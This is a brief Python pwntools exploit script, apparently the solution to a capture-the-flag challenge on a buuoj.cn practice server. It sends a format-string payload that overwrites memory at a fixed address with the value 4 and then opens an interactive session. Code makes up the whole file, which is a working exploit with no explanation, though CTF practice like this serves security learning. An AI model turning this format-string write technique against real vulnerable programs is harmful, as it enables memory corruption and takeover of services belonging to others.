from pwn import *


p = remote("node4.buuoj.cn", 29497)


offset = 11

mark = 0x0804A02C
pad = fmtstr_payload(offset, writes={mark:4})
p.send(pad)

p.interactive()

